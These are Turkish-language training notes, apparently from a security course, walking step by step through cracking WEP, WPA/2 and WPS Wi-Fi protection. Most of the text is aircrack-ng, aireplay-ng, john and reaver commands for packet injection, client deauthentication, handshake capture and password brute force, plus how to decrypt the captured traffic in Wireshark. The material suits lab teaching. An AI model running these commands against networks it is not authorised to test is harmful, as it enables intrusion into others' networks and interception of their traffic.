## WEP

- WEP'te IV (Initation vector) başlığa açık olarak yerleştirilir. Açık olan değerle şifreli değeri kıyaslayarak anahtarı bulmaya çalışırız. WEP'te anahtara ihtiyaç olmadan oturum kurma imkanı vardır. Bu zafiyet bize paket enjeksiyonu yapma imkanı verir.

**- WEP Parolası Kırma Uygulaması:**

    => airmon-ng start wlan0
    
    => airodump-ng wlan0mon
    
    => airodump-ng wlan0mon --bssid C0:4A:00:E9:08:2C -c 1 -w lyk201wep
    
    => (Yeni terminal) aireplay-ng --fakeauth 1 -a C0:4A:00:E9:08:2C wlan0mon (paket enjekte etmemizi sağlayan araç)
    
    => aireplay-ng --arpreplay -b C0:4A:00:E9:08:2C wlan0mon (paket enjekte eder)
    
    => (64bit için = DATA 5.000, 128bit için = DATA 35.000-40.000) aircrack-ng lyk2016.cap (KEY FOUND!)

## WPA/2

- Four-way handshake'e dayanır. Brute-force'a açıktır. Ağa bağlı bir istemci yoksa kırılamaz.

**- İşleyiş:** WEP için yapılan işlemleri tekrar et. Ön koşullar: bir istemcinin WPA/2 ağındaki oturumunu baştan sona kaydetmek. Bağlı istemcileri düşürüp tekrar bağlanmasını sağlayarak veya istemcinin bağlanmasını bekleyerek yapılabilir.

**- İstemciyi düşürerek WPA/2 kırma uygulaması:**

    => aireplay-ng --deauth 0 -a BSSID -c STATION wlan0mon (İstemciyi düşürüyoruz)
    
    => airodump-ng wlan0mon --bssid C0:4A:00:E9:08:2C -c 6 -w lyk201wpa2 (Kanalı dinlemeye alıp istemci tekrar bağlanmasını bekliyoruz. İstemci tekrar bağlandığında bütün oturumu kaydediyoruz.)
    
    => aircrack-ng lyk2016wpa4-01.cap -w /usr/share/wordlists/ (Hazır wordlist'lerden birini kullanarak parolayı kırmaya çalışıyoruz.)
    
    => vi /tmp/sozluk.txt (Parolayı kırmak için bir wordlist oluşturuyoruz.)
    
    => aircrack-ng lyk2016wpa4-01.cap -w /tmp/sozluk.txt (Oluşturduğumuz wordlist'i kullanarak parolayı kırmaya çalışıyoruz.)

**- Brute Force:**

    => john --incremental --stdout | aircrack-ng lyk2016wpa4-01.cap -b BSSID -w -

**- Wireshark filter:** Kaydettiğimiz oturumu Wireshark ile inceleyebiliriz. Parolayı kırabilirsek bütün paketler plain text(açık metin) olarak gözükür.

**- Kırdığımız parolayla paketleri Wireshark'ta plain text'e dönüştürmek için:**
    
    - Edit -> Preferences -> Protocols -> ieee 802.11 -> Decryption Keys: Edit -> [+] wpa-pwd -> KEY: password:ESSID

**- WPS:** 8 bitlik doğruluma kullanılır. 10^7 (1 bit tahminle yaklaşık 8 saatte çözülebilir. İki parça şeklinde, 4 + 3 gönderiliyor. İlk 4'lük doğruysa geri kalan 3 yollanır.

    => wash -i wlan0mon -wps'li AP(Access Point)'leri bulur
    
    => reaver -i wlan0mon -b BSSID -vv (-p <pin>)
    
    
